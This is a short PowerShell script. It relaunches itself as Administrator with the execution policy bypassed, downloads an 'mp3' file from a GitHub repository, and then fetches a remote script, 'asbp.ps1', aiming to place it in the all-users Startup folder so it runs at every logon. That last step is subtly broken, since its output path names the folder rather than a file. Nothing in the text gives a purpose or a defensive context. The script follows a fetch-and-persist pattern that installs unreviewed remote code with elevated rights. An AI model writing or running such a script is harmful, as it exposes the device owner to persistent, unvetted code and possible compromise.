if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
$url = "https://github.com/JustAGerman/Powershell/raw/main/2.mp3"
$output = "$env:USERPROFILE\2.mp3"

Invoke-WebRequest -Uri $url -OutFile $output

$url = "https://raw.githubusercontent.com/JustAGerman/Powershell/main/asbp.ps1"
$output = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

Invoke-WebRequest -Uri $url -OutFile $output

Write-Host -NoNewLine 'Press any key to exit';
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');